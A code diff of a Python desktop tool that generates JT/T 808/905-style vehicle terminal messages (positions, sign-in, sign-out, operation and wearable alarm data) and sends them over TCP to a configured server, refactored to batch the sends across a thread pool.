@@ -1,6 +1,9 @@
 import binascii
 import csv
 import os
+import time
+import requests
+import zipfile
 import threading
 import tkinter as tk
 from tkinter import *
@@ -16,11 +19,19 @@ from 报警 import *
 import webview
 from tkinter import messagebox
 import sys
-
-is_on = True
+import subprocess
+from 小说 import 蓝奏云直链
+import signal
+from Crypto.Cipher import AES
+from binascii import b2a_hex, a2b_hex
+import base64
+from concurrent.futures import ThreadPoolExecutor
 from tkinter.messagebox import *
 import fnmatch
 
+from 平凡版本封装 import *
+
+is_on = True
 LOG_LINE_NUM = 0
 init_window = ttk.Window()
 
@@ -29,75 +40,6 @@ s.theme_use("superhero")
 
 now_time = time.strftime('%Y%m%d%H%M%S', time.localtime())
 now_time1 = time.strftime('%H%M%S', time.localtime())
-
-
-def char_to_hex(char):
-    return hex(ord(char))[2:]
-
-
-def copy(editor, event=None):
-    editor.event_generate("<<Copy>>")
-
-
-def paste(editor, event=None):
-    editor.event_generate('<<Paste>>')
-
-
-def selectAll(editor, event=None):
-    editor.tag_add('sel', '1.0', END)
-
-
-# V3校验位
-def crc1(data):
-    crc = 0xFFFF
-    data = binascii.unhexlify(data)
-
-    for pos in data:
-        crc ^= pos
-        for i in range(8):
-            lsb = crc & 0x0001
-            crc >>= 1
-            if lsb == 1:
-                crc ^= 0x8408
-    crc ^= 0xffff
-    test = hex(crc).upper()
-    return test
-
-
-def get_xor(data):
-    result = re.sub(r"(?<=\w)(?=(?:\w\w)+$)", " ", data)
-    return result
-
-
-def get_bcc(inputStr: str) -> str:
-    bcc = 0
-    for i in inputStr.split(' '):
-        bcc = bcc ^ int(i, 16)
-
-    return f'{bcc:x}'
-
-
-def get_longitude(base_log=None, radius=None):
-    radius_in_degrees = radius / 111300
-    u = float(random.uniform(0.0, 1.0))
-    v = float(random.uniform(0.0, 1.0))
-    w = radius_in_degrees * math.sqrt(u)
-    t = 2 * math.pi * v
-    y = w * math.sin(t)
-    longitude = y + base_log
-    return str(longitude)[:10]
-
-
-def get_latitude(base_lat=None, radius=None):
-    radius_in_degrees = radius / 111300
-    u = float(random.uniform(0.0, 1.0))
-    v = float(random.uniform(0.0, 1.0))
-    w = radius_in_degrees * math.sqrt(u)
-    t = 2 * math.pi * v
-    x = w * math.cos(t)
-    latitude = x + base_lat
-    return str(latitude)[:9]
-
 
 current_directory = os.getcwd()
 
@@ -109,6 +51,9 @@ gif_pattern = '*.gif'
 class MY_GUI(tk.Tk):
     def __init__(self, init_window_name):
         self.init_window_name = init_window_name
+        self.load_config()
+
+    def load_config(self):
         conf_ini = current_directory + "\\conf\\config.ini"
         config = ConfigObj(conf_ini, encoding='UTF-8')
         self.conf_cswg = config['ces']['出租车_cswg']
@@ -128,6 +73,8 @@ class MY_GUI(tk.Tk):
         self.jiexurl = config['URL']['jiexurl']
         self.Zombie = config['Zombie']['range']
         self.jinyong = config['Zombie']['jinyong']
+        self.key = config['xsz']['key']
+        self.iv = config['xsz']['iv']
 
     def wzhi905(self, su, plsu):
         global data, t
@@ -152,40 +99,14 @@ class MY_GUI(tk.Tk):
             高程 = '0302' + f'{1}'.zfill(4)
             附加 = f'0104000000{self.lic1().zfill(2)}0202044C{高程}250400000000300103'
             if self.sb_on() == '是':
-                for i in range(int(su), int(plsu)):
-                    ISU标识 = self.sb_hao().zfill(12)[:12 - len(f'{i}')] + f'{i}'
-                    w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 速度 + 方向 + 时间 + 附加
-                    a = get_xor(w)
-                    b = get_bcc(a)
-                    E = w + b.upper().zfill(2)
-                    t = 标识位 + E.replace("7E", "00") + 标识位
-                    D = get_xor(E)
-                    data = '7E ' + D + ' 7E'
-                    if data[:2] != "7E":
-                        print(f"错误：{data}")
-                        t = t[:81] + "00" + t[82:]
-                        data = get_xor(t)
-                        print("修改后data：{}".format(data))
-                        print('\n' * 1)
-                    count += 1
-                    tip_content = '\n位置数据：\n{}\n源数据：\n{}\n'.format(data, t)
-                    self.result_data_Text1.insert(1.0, tip_content)
-                    time.sleep(float(self.times()))
-                    if self.ip_on() == '是':
-                        s = socket(AF_INET, SOCK_STREAM)
-                        s.connect((f'{self.ip()}', int(self.port())))
-                        s.settimeout(5)
-                        try:
-                            s.send(bytes().fromhex(data))
-                            send = s.recv(1024).hex()
-                            print(send.upper())
-                            print('\n' * 1)
-                            tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
-                            self.result_data_Text1.insert(1.0, tip_content)
-                        except:
-                            self.result_data_Text1.delete(1.0, END)
-                            self.result_data_Text1.insert(1.0, "连接超时，未收到服务器响应")
-                showinfo("发送结果", "总计发送成功位置数据条数:  {}".format(str(count)))
+                with ThreadPoolExecutor(max_workers=5) as executor:
+                    # 将任务提交给线程池
+                    executor.submit(self.qo_login批量905, 0, int(plsu) / 4)
+                    executor.submit(self.qo_login批量905, int(plsu) / 4, int(plsu) / 2)
+                    executor.submit(self.qo_login批量905, int(plsu) / 2, int(plsu) / 1.3)
+                    executor.submit(self.qo_login批量905, int(plsu) / 1.3, int(plsu) / 1.25)
+                    executor.submit(self.qo_login批量905, int(plsu) / 1.25, int(plsu))
+                self.result_data_Text1.insert(1.0, "位置数据发送成功\n\n")
             else:
                 ISU标识 = self.sb_hao().zfill(12)
                 w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 速度 + 方向 + 时间 + 附加
@@ -207,7 +128,6 @@ class MY_GUI(tk.Tk):
                 time.sleep(float(self.times()))
                 if self.ip_on() == '是':
                     s = socket(AF_INET, SOCK_STREAM)
-
                     s.connect((f'{self.ip()}', int(self.port())))
                     s.settimeout(5)
                     try:
@@ -221,9 +141,9 @@ class MY_GUI(tk.Tk):
                         self.result_data_Text1.delete(1.0, END)
                         self.result_data_Text1.insert(1.0, "连接超时，未收到服务器响应")
                     showinfo("发送结果", "总计发送成功位置数据条数:  {}".format(str(count)))
+                self.result_data_Text1.insert(1.0, "总计发送成功位置数据条数:{}\n\n".format(str(count)))
         except:
             return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
-        self.result_data_Text1.insert(1.0, "总计发送成功位置数据条数:{}\n\n".format(str(count)))
         return ''
 
     # 部标位置
@@ -252,46 +172,15 @@ class MY_GUI(tk.Tk):
             时间 = now_time[2:]
             附加信息ID = f'0104000000{self.lic().zfill(2)}0202044C250400000000300103'
             if self.sb_on2() == '是':
-                for i in range(int(su2), int(plsu2)):
-                    设备号 = self.sb_hao2().zfill(12)[:12 - len(f'{i}')] + f'{i}'
-                    print(设备号)
-                    w = 消息ID + 消息体属性 + 设备号 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 高程 + 速度 + 方向 + 时间 + 附加信息ID
-                    a = get_xor(w)
-                    b = get_bcc(a)
-                    if b.upper() == "7E":
-                        a.replace("00", "01")
-                        b = get_bcc(a)
-                    E = w + b.upper().zfill(2)
-                    t = 标识位 + E.replace("7E", "01") + 标识位
-                    D = get_xor(E)
-                    data = '7E ' + D + ' 7E'
-                    if data[:2] != "7E":
-                        print(f"错误：{data}")
-                        t = t[:81] + "00" + t[82:]
-                        data = get_xor(t)
-                        print("修改后data：{}".format(data))
-                        print('\n' * 1)
-                    print(data)
-                    count += 1
-                    tip_content = '\n位置数据：\n{}\n源数据：\n{}\n'.format(data, t)
-                    self.result_data_Text2.insert(1.0, tip_content)
-                    time.sleep(float(self.times()))
-                    if self.ip_on2() == '是':
-                        s = socket(AF_INET, SOCK_STREAM)
-                        s.connect((f'{self.ip2()}', int(self.port2())))
-                        s.settimeout(5)
-                        try:
-                            s.send(bytes().fromhex(data))
-                            send = s.recv(1024).hex()
-                            print(send.upper())
-                            print('\n' * 1)
-                            tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
-
-                            self.result_data_Text2.insert(1.0, tip_content)
-                        except:
-                            self.result_data_Text2.delete(1.0, END)
-                            self.result_data_Text2.insert(1.0, "连接超时，未收到服务器响应")
-                showinfo("发送结果", "总计发送成功位置数据条数:  {}".format(str(count)))
+                # 创建一个线程池，包含两个线程
+                with ThreadPoolExecutor(max_workers=5) as executor:
+                    # 将任务提交给线程池
+                    executor.submit(self.qo_login批量部标, 0, int(plsu2) / 4)
+                    executor.submit(self.qo_login批量部标, int(plsu2) / 4, int(plsu2) / 2)
+                    executor.submit(self.qo_login批量部标, int(plsu2) / 2, int(plsu2) / 1.3)
+                    executor.submit(self.qo_login批量部标, int(plsu2) / 1.3, int(plsu2) / 1.25)
+                    executor.submit(self.qo_login批量部标, int(plsu2) / 1.25, int(plsu2))
+                self.result_data_Text2.insert(1.0, "位置数据发送成功\n\n")
             else:
                 设备号 = self.sb_hao2().zfill(12)
                 w = 消息ID + 消息体属性 + 设备号 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 高程 + 速度 + 方向 + 时间 + 附加信息ID
@@ -330,9 +219,9 @@ class MY_GUI(tk.Tk):
                         self.result_data_Text2.delete(1.0, END)
                         self.result_data_Text2.insert(1.0, "连接超时，未收到服务器响应")
                     showinfo("发送结果", "总计发送成功位置数据条数:  {}".format(str(count)))
+                self.result_data_Text2.insert(1.0, "总计发送成功位置数据条数:{}\n".format(str(count)))
         except:
             return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
-        self.result_data_Text2.insert(1.0, "总计发送成功位置数据条数:{}\n".format(str(count)))
         return ""
 
     def 轨迹808(self):
@@ -538,45 +427,15 @@ class MY_GUI(tk.Tk):
             开机时间 = now_time[:12]
             附加 = '01040000006E0202044C250400000000300103'
             if self.sb_on() == '是':
-                for i in range(int(su), int(plsu)):
-                    ISU标识 = self.sb_hao().zfill(12)[:12 - len(f'{i}')] + f'{i}'
-                    w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 速度 + 方向 + 时间 + 企业经营许可证号 + 驾驶员从业资格证号 + 车牌号 + 开机时间 + 附加
-                    a = get_xor(w)
-                    b = get_bcc(a)
-                    E = w + b.upper().zfill(2)
-                    t = 标识位 + E.replace("7E", "00") + 标识位
-                    D = get_xor(E)
-                    data = '7E ' + D + ' 7E'
-                    if data[:2] != "7E":
-                        print(f"错误：{data}")
-                        t = t[:81] + "00" + t[82:]
-                        data = get_xor(t)
-                        print("修改后data：{}".format(data))
-                        print('\n' * 1)
-                    print(t)
-                    print(data)
-                    count += 1
-                    tip_content = '\n签到数据：\n{}\n源数据：{}\n'.format(data, t)
-                    self.result_data_Text1.insert(1.0, tip_content)
-                    time.sleep(float(self.times()))
-                    if self.ip_on() == '是':
-                        s = socket(AF_INET, SOCK_STREAM)
-
-                        s.connect((f'{self.ip()}', int(self.port())))
-                        s.settimeout(5)
-                        try:
-                            s.send(bytes().fromhex(data))
-                            send = s.recv(1024).hex()
-                            print(send.upper())
-                            print('\n' * 1)
-                            tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
-                            self.result_data_Text1.insert(1.0, tip_content)
-                        except:
-                            self.result_data_Text1.delete(1.0, END)
-                            self.result_data_Text1.insert(1.0, "连接超时，未收到服务器响应")
-                showinfo("发送结果", "总计发送成功签到数据条数:  {}".format(str(count)))
+                with ThreadPoolExecutor(max_workers=5) as executor:
+                    # 将任务提交给线程池
+                    executor.submit(self.qo_login批量905签到, 0, int(plsu) / 4)
+                    executor.submit(self.qo_login批量905签到, int(plsu) / 4, int(plsu) / 2)
+                    executor.submit(self.qo_login批量905签到, int(plsu) / 2, int(plsu) / 1.3)
+                    executor.submit(self.qo_login批量905签到, int(plsu) / 1.3, int(plsu) / 1.25)
+                    executor.submit(self.qo_login批量905签到, int(plsu) / 1.25, int(plsu))
+                self.result_data_Text1.insert(1.0, "签到数据发送成功\n\n")
             else:
-
                 ISU标识 = self.sb_hao().zfill(12)
                 w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 速度 + 方向 + 时间 + 企业经营许可证号 + 驾驶员从业资格证号 + 车牌号 + 开机时间 + 附加
                 a = get_xor(w)
@@ -612,9 +471,9 @@ class MY_GUI(tk.Tk):
                         self.result_data_Text1.delete(1.0, END)
                         self.result_data_Text1.insert(1.0, "连接超时，未收到服务器响应")
                     showinfo("发送结果", "总计发送成功签到数据条数:  {}".format(str(count)))
+                self.result_data_Text1.insert(1.0, "总计发送成功签到数据条数:{}\n\n".format(str(count)))
         except:
             return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
-        self.result_data_Text1.insert(1.0, "总计发送成功签到数据条数:{}\n\n".format(str(count)))
         return ""
 
     def qtui(self, su, plsu):
@@ -658,46 +517,14 @@ class MY_GUI(tk.Tk):
             总营运次数 = '0000001A'  # 高位在前就是在后面
             附加 = '01040000006E0202044C250400000000300103'
             if self.sb_on() == '是':
-                for i in range(int(su), int(plsu)):
-                    ISU标识 = self.sb_hao().zfill(12)[:12 - len(f'{i}')] + f'{i}'
-                    if (i % 2) == 0:
-                        签退方式 = '01'
-                    else:
-                        签退方式 = '00'
-                    w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 速度 + 方向 + 时间 + 企业经营许可证号 + 驾驶员从业资格证号 + 车牌号 + 计价器K值 + 当班开机时间 + 当班关机时间 + 当班里程 + 当班营运里程 + 车次 + 计时时间 + 总计金额 + 卡收金额 + 卡次 + 班间里程 + 总计里程 + 总营运里程 + 单价 + 总营运次数 + 签退方式 + 附加
-                    a = get_xor(w)
-                    b = get_bcc(a)
-                    E = w + b.upper().zfill(2)
-                    t = 标识位 + E.replace("7E", "00") + 标识位
-                    D = get_xor(E)
-                    data = '7E ' + D + ' 7E'
-                    if data[:2] != "7E":
-                        print(f"错误：{data}")
-                        t = t[:81] + "00" + t[82:]
-                        data = get_xor(t)
-                        print("修改后data：{}".format(data))
-                        print('\n' * 1)
-                    print(t)
-                    print(data)
-                    count += 1
-                    tip_content = '\n签退数据：\n{}\n源数据：{}\n'.format(data, t)
-                    self.result_data_Text1.insert(1.0, tip_content)
-                    time.sleep(float(self.times()))
-                    if self.ip_on() == '是':
-                        s = socket(AF_INET, SOCK_STREAM)
-                        s.connect((f'{self.ip()}', int(self.port())))
-                        s.settimeout(5)
-                        try:
-                            s.send(bytes().fromhex(data))
-                            send = s.recv(1024).hex()
-                            print(send.upper())
-                            print('\n' * 1)
-                            tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
-                            self.result_data_Text1.insert(1.0, tip_content)
-                        except:
-                            self.result_data_Text1.delete(1.0, END)
-                            self.result_data_Text1.insert(1.0, "连接超时，未收到服务器响应")
-                showinfo("发送结果", "总计发送成功签退数据条数:  {}".format(str(count)))
+                with ThreadPoolExecutor(max_workers=5) as executor:
+                    # 将任务提交给线程池
+                    executor.submit(self.qo_login批量905签退, 0, int(plsu) / 4)
+                    executor.submit(self.qo_login批量905签退, int(plsu) / 4, int(plsu) / 2)
+                    executor.submit(self.qo_login批量905签退, int(plsu) / 2, int(plsu) / 1.3)
+                    executor.submit(self.qo_login批量905签退, int(plsu) / 1.3, int(plsu) / 1.25)
+                    executor.submit(self.qo_login批量905签退, int(plsu) / 1.25, int(plsu))
+                self.result_data_Text1.insert(1.0, "签退数据发送成功\n\n")
             else:
                 ISU标识 = self.sb_hao().zfill(12)
                 签退方式 = '00'
@@ -735,9 +562,9 @@ class MY_GUI(tk.Tk):
                         self.result_data_Text1.delete(1.0, END)
                         self.result_data_Text1.insert(1.0, "连接超时，未收到服务器响应")
                     showinfo("发送结果", "总计发送成功签退数据条数:  {}".format(str(count)))
+                self.result_data_Text1.insert(1.0, "总计发送成功签退数据条数:{}\n\n".format(str(count)))
         except:
             return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
-        self.result_data_Text1.insert(1.0, "总计发送成功签退数据条数:{}\n\n".format(str(count)))
         return ""
 
     def yyun(self, su, plsu):
@@ -795,43 +622,14 @@ class MY_GUI(tk.Tk):
             交易类型 = '03'
             附加 = '01040000006E0202044C250400000000300103'
             if self.sb_on() == '是':
-                for i in range(int(su), int(plsu)):
-                    ISU标识 = self.sb_hao().zfill(12)[:12 - len(f'{i}')] + f'{i}'
-                    当前车次 = f'{2}'.zfill(8)
-                    w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 速度 + 方向 + 时间 + 报警1 + 状态1 + 纬度1 + 经度1 + 速度1 + 方向1 + 时间1 + 营运ID + 评价ID + 评价选项 + 评价选项扩展 + 电召订单ID + 车牌号 + 企业经营许可证号 + 驾驶员从业资格证号 + 上车时间1 + 下车时间 + 计程公里数 + 空驶里程 + 附加费 + 等待计时时间 + 交易金额 + 当前车次 + 交易类型 + 附加
-                    a = get_xor(w)
-                    b = get_bcc(a)
-                    E = w + b.upper().zfill(2)
-                    t = 标识位 + E.replace("7E", "00") + 标识位
-                    D = get_xor(E)
-                    data = '7E ' + D + ' 7E'
-                    if data[:2] != "7E":
-                        print(f"错误：{data}")
-                        t = t[:81] + "00" + t[82:]
-                        data = get_xor(t)
-                        print("修改后data：{}".format(data))
-                        print('\n' * 1)
-                    print(t)
-                    print(data)
-                    count += 1
-                    tip_content = '\n营运数据：\n{}\n源数据：{}\n'.format(data, t)
-                    self.result_data_Text1.insert(1.0, tip_content)
-                    time.sleep(float(self.times()))
-                    if self.ip_on() == '是':
-                        s = socket(AF_INET, SOCK_STREAM)
-                        s.connect((f'{self.ip()}', int(self.port())))
-                        s.settimeout(5)
-                        try:
-                            s.send(bytes().fromhex(data))
-                            send = s.recv(1024).hex()
-                            print(send.upper())
-                            print('\n' * 1)
-                            tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
-                            self.result_data_Text1.insert(1.0, tip_content)
-                        except:
-                            self.result_data_Text1.delete(1.0, END)
-                            self.result_data_Text1.insert(1.0, "连接超时，未收到服务器响应")
-                showinfo("发送结果", "总计发送成功营运数据条数:  {}".format(str(count)))
+                with ThreadPoolExecutor(max_workers=5) as executor:
+                    # 将任务提交给线程池
+                    executor.submit(self.qo_login批量905营运, 0, int(plsu) / 4)
+                    executor.submit(self.qo_login批量905营运, int(plsu) / 4, int(plsu) / 2)
+                    executor.submit(self.qo_login批量905营运, int(plsu) / 2, int(plsu) / 1.3)
+                    executor.submit(self.qo_login批量905营运, int(plsu) / 1.3, int(plsu) / 1.25)
+                    executor.submit(self.qo_login批量905营运, int(plsu) / 1.25, int(plsu))
+                self.result_data_Text1.insert(1.0, "营运数据发送成功\n\n")
             else:
                 ISU标识 = self.sb_hao().zfill(12)
                 当前车次 = f'{2}'.zfill(8)
@@ -869,9 +667,9 @@ class MY_GUI(tk.Tk):
                         self.result_data_Text1.delete(1.0, END)
                         self.result_data_Text1.insert(1.0, "连接超时，未收到服务器响应")
                     showinfo("发送结果", "总计发送成功营运数据条数:  {}".format(str(count)))
+                self.result_data_Text1.insert(1.0, "总计发送成功营运数据条数:{}\n\n".format(str(count)))
         except:
             return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
-        self.result_data_Text1.insert(1.0, "总计发送成功营运数据条数:{}\n\n".format(str(count)))
         return ""
 
     # 抢答订单
@@ -1619,6 +1417,188 @@ class MY_GUI(tk.Tk):
                      "探头遮挡报警", "双脱把报警（双手同时脱离方向盘）")
         self.init_data3_Text7["values"] = items
 
+    def getMon2(self, items):
+        inits = self.init_data_Text11.get().strip()
+        if inits == "报警数据":
+            items = ("SOS报警", "关机报警", "缺电报警", "自动关机报警", "开机报警",
+                     "设备充电", "电源已断开", "设备电量已充满")
+            self.zd_data_label11.grid(row=14, column=0, sticky=N)
+            self.zd_data_Text11.grid(row=15, column=0, columnspan=10, sticky=N)
+            self.xue_data_label11.grid_remove()
+            self.xue_data_Text11.grid_remove()
+            self.xinlv_data_label11.grid_remove()
+            self.xinlv_data_Text11.grid_remove()
+            self.wendu1_data_label11.grid_remove()
+            self.wendu1_data_Text11.grid_remove()
+            self.pdai_data_label11.grid_remove()
+            self.pdai_data_Text11.grid_remove()
+            self.sb_data_label11.grid_remove()
+            self.sb_data_Text11.grid_remove()
+            self.power_data_label11.grid_remove()
+            self.power_data_Text11.grid_remove()
+            self.busu_data_label11.grid_remove()
+            self.busu_data_Text11.grid_remove()
+            self.zd_data_Text11.delete(0, 10)
+            inits = self.zd_data_Text11.get()
+            if inits == "关机报警" or inits == "缺电报警" or inits == "自动关机报警" or inits == "开机报警" or inits == "设备充电" or inits == "电源已断开" or inits == "设备电量已充满":
+                self.repower_data_label11.grid(row=16, column=0, sticky=N)
+                self.repower_data_Text11.grid(row=17, column=0, columnspan=10, sticky=N)
+            else:
+                self.repower_data_label11.grid_remove()
+                self.repower_data_Text11.grid_remove()
+                self.phone_data_label11.grid_remove()
+                self.phone_data_Text11.grid_remove()
+                self.dial_data_label11.grid_remove()
+                self.dial_data_Text11.grid_remove()
+                self.mode_data_label11.grid_remove()
+                self.mode_data_Text11.grid_remove()
+                self.wendu_data_label11.grid_remove()
+                self.wendu_data_Text11.grid_remove()
+        elif inits == "心跳数据":
+            self.zd_data_label11.grid_remove()
+            self.zd_data_Text11.grid_remove()
+            self.zd_data_Text11.delete(0, 10)
+            self.repower_data_label11.grid_remove()
+            self.repower_data_Text11.grid_remove()
+            self.mode_data_label11.grid_remove()
+            self.mode_data_Text11.grid_remove()
+            self.wendu_data_label11.grid_remove()
+            self.wendu_data_Text11.grid_remove()
+            self.xue_data_label11.grid_remove()
+            self.xue_data_Text11.grid_remove()
+            self.xinlv_data_label11.grid_remove()
+            self.xinlv_data_Text11.grid_remove()
+            self.wendu1_data_label11.grid_remove()
+            self.wendu1_data_Text11.grid_remove()
+            self.pdai_data_label11.grid_remove()
+            self.pdai_data_Text11.grid_remove()
+            self.sb_data_label11.grid_remove()
+            self.sb_data_Text11.grid_remove()
+            self.power_data_label11.grid(row=14, columnspan=2, sticky=W)
+            self.power_data_Text11.grid(row=15, column=0, sticky=W)
+            self.busu_data_label11.grid(row=14, columnspan=2, sticky=E)
+            self.busu_data_Text11.grid(row=15, column=0, sticky=E)
+        elif inits == "终端上报":
+            items = ("设备模式上报", "设备登录", "获取天气信息", "健康心率血氧参数上报", "健康参数上报", "通话记录上报")
+            self.zd_data_label11.grid(row=14, column=0, sticky=N)
+            self.zd_data_Text11.grid(row=15, column=0, columnspan=10, sticky=N)
+            self.zd_data_Text11.delete(0, 10)
+            self.repower_data_label11.grid_remove()
+            self.repower_data_Text11.grid_remove()
+            self.phone_data_label11.grid_remove()
+            self.dial_data_Text11.grid_remove()
+            self.mode_data_label11.grid_remove()
+            self.mode_data_Text11.grid_remove()
+            self.wendu_data_label11.grid_remove()
+            self.wendu_data_Text11.grid_remove()
+            self.power_data_label11.grid_remove()
+            self.power_data_Text11.grid_remove()
+            self.busu_data_label11.grid_remove()
+            self.busu_data_Text11.grid_remove()
+        else:
+            items = ()
+            self.power_data_label11.grid_remove()
+            self.power_data_Text11.grid_remove()
+            self.busu_data_label11.grid_remove()
+            self.busu_data_Text11.grid_remove()
+            self.phone_data_label11.grid_remove()
+            self.phone_data_Text11.grid_remove()
+            self.dial_data_label11.grid_remove()
+            self.dial_data_Text11.grid_remove()
+            self.mode_data_label11.grid_remove()
+            self.mode_data_Text11.grid_remove()
+            self.wendu_data_label11.grid_remove()
+            self.wendu_data_Text11.grid_remove()
+            self.xue_data_label11.grid_remove()
+            self.xue_data_Text11.grid_remove()
+            self.xinlv_data_label11.grid_remove()
+            self.xinlv_data_Text11.grid_remove()
+            self.wendu1_data_label11.grid_remove()
+            self.wendu1_data_Text11.grid_remove()
+            self.pdai_data_label11.grid_remove()
+            self.pdai_data_Text11.grid_remove()
+            self.sb_data_label11.grid_remove()
+            self.sb_data_Text11.grid_remove()
+            self.zd_data_Text11.delete(0, 10)
+        self.zd_data_Text11["values"] = items
+
+    def getMon3(self, items):
+        inits = self.zd_data_Text11.get()
+        if inits == "关机报警" or inits == "缺电报警" or inits == "自动关机报警" or inits == "开机报警" or inits == "设备充电" or inits == "电源已断开" or inits == "设备电量已充满":
+            self.repower_data_label11.grid(row=16, column=0, sticky=N)
+            self.repower_data_Text11.grid(row=17, column=0, columnspan=10, sticky=N)
+        elif inits == "通话记录上报":
+            self.wendu_data_label11.grid_remove()
+            self.wendu_data_Text11.grid_remove()
+            self.phone_data_label11.grid(row=16, columnspan=2, sticky=W)
+            self.phone_data_Text11.grid(row=17, column=0, sticky=W)
+            self.dial_data_label11.grid(row=16, columnspan=2, sticky=E)
+            self.dial_data_Text11.grid(row=17, column=0, sticky=E)
+        elif inits == "设备模式上报":
+            self.xue_data_label11.grid_remove()
+            self.xue_data_Text11.grid_remove()
+            self.xinlv_data_label11.grid_remove()
+            self.xinlv_data_Text11.grid_remove()
+            self.wendu1_data_label11.grid_remove()
+            self.wendu1_data_Text11.grid_remove()
+            self.pdai_data_label11.grid_remove()
+            self.pdai_data_Text11.grid_remove()
+            self.sb_data_label11.grid_remove()
+            self.sb_data_Text11.grid_remove()
+            self.mode_data_label11.grid(row=16, column=0, sticky=N)
+            self.mode_data_Text11.grid(row=17, column=0, columnspan=10, sticky=N)
+        elif inits == "健康心率血氧参数上报":
+            self.wendu_data_label11.grid_remove()
+            self.wendu_data_Text11.grid_remove()
+            self.xue_data_label11.grid(row=16, columnspan=2, sticky=W)
+            self.xue_data_Text11.grid(row=17, column=0, sticky=W)
+            self.xinlv_data_label11.grid(row=16, columnspan=2, sticky=E)
+            self.xinlv_data_Text11.grid(row=17, column=0, sticky=E)
+            self.wendu1_data_label11.grid(row=18, column=0, sticky=N)
+            self.wendu1_data_Text11.grid(row=19, column=0, columnspan=10, sticky=N)
+            self.pdai_data_label11.grid(row=20, columnspan=2, sticky=W)
+            self.pdai_data_Text11.grid(row=21, column=0, sticky=W)
+            self.sb_data_label11.grid(row=20, columnspan=2, sticky=E)
+            self.sb_data_Text11.grid(row=21, column=0, sticky=E)
+        elif inits == "健康参数上报":
+            self.phone_data_label11.grid_remove()
+            self.phone_data_Text11.grid_remove()
+            self.dial_data_label11.grid_remove()
+            self.dial_data_Text11.grid_remove()
+            self.xue_data_label11.grid_remove()
+            self.xue_data_Text11.grid_remove()
+            self.xinlv_data_label11.grid_remove()
+            self.xinlv_data_Text11.grid_remove()
+            self.wendu1_data_label11.grid_remove()
+            self.wendu1_data_Text11.grid_remove()
+            self.pdai_data_label11.grid_remove()
+            self.pdai_data_Text11.grid_remove()
+            self.sb_data_label11.grid_remove()
+            self.sb_data_Text11.grid_remove()
+            self.wendu_data_label11.grid(row=16, column=0, sticky=N)
+            self.wendu_data_Text11.grid(row=17, column=0, columnspan=10, sticky=N)
+        else:
+            self.repower_data_label11.grid_remove()
+            self.repower_data_Text11.grid_remove()
+            self.wendu_data_label11.grid_remove()
+            self.wendu_data_Text11.grid_remove()
+            self.phone_data_label11.grid_remove()
+            self.phone_data_Text11.grid_remove()
+            self.dial_data_label11.grid_remove()
+            self.dial_data_Text11.grid_remove()
+            self.mode_data_label11.grid_remove()
+            self.mode_data_Text11.grid_remove()
+            self.xue_data_label11.grid_remove()
+            self.xue_data_Text11.grid_remove()
+            self.xinlv_data_label11.grid_remove()
+            self.xinlv_data_Text11.grid_remove()
+            self.wendu1_data_label11.grid_remove()
+            self.wendu1_data_Text11.grid_remove()
+            self.pdai_data_label11.grid_remove()
+            self.pdai_data_Text11.grid_remove()
+            self.sb_data_label11.grid_remove()
+            self.sb_data_Text11.grid_remove()
+
     def show_menu(self, event):
         self.init_window_name.menu.post(event.x_root, event.y_root)
 
@@ -2095,6 +2075,334 @@ class MY_GUI(tk.Tk):
                 self.result_data_Text2.delete(1.0, END)
                 self.result_data_Text2.insert(1.0, self.wzhi部标(self.su2(), self.plsu2()))
 
+    def qo_login批量部标(self, su2, plsu2):
+        wd1 = float(self.wd部标())
+        wd2 = wd1 * 1000000
+        wd3 = hex(int(wd2))
+        jd1 = float(self.jd部标())
+        jd2 = jd1 * 1000000
+        jd3 = hex(int(jd2))
+        标识位 = '7E'
+        消息ID = '0200'
+        消息体属性 = '002F'
+        流水号 = f'{random.randint(12, 20)}'.zfill(4)
+        报警 = self.sb_bj2()
+        状态 = self.sb_ztai2()
+        纬度 = wd3[2:].zfill(8).upper()
+        经度 = jd3[2:].zfill(8).upper()
+        高程 = f'00{random.randint(12, 20)}'
+        速度 = self.sdu2()[2:].zfill(4).upper()
+        方向 = f'00{random.randint(12, 20)}'
+        时间 = now_time[2:]
+        附加信息ID = f'0104000000{self.lic().zfill(2)}0202044C250400000000300103'
+        for i in range(int(su2), int(plsu2)):
+            设备号 = self.sb_hao2().zfill(12)[:12 - len(f'{i}')] + f'{i}'
+            print(设备号)
+            w = 消息ID + 消息体属性 + 设备号 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 高程 + 速度 + 方向 + 时间 + 附加信息ID
+            a = get_xor(w)
+            b = get_bcc(a)
+            if b.upper() == "7E":
+                a.replace("00", "01")
+                b = get_bcc(a)
+            E = w + b.upper().zfill(2)
+            t = 标识位 + E.replace("7E", "01") + 标识位
+            D = get_xor(E)
+            data = '7E ' + D + ' 7E'
+            if data[:2] != "7E":
+                print(f"错误：{data}")
+                t = t[:81] + "00" + t[82:]
+                data = get_xor(t)
+                print("修改后data：{}".format(data))
+                print('\n' * 1)
+            print(data)
+            tip_content = '\n位置数据：\n{}\n源数据：\n{}\n'.format(data, t)
+            self.result_data_Text2.insert(1.0, tip_content)
+            time.sleep(float(self.times()))
+            if self.ip_on2() == '是':
+                s = socket(AF_INET, SOCK_STREAM)
+                s.connect((f'{self.ip2()}', int(self.port2())))
+                s.settimeout(5)
+                try:
+                    s.send(bytes().fromhex(data))
+                    send = s.recv(1024).hex()
+                    print(send.upper())
+                    print('\n' * 1)
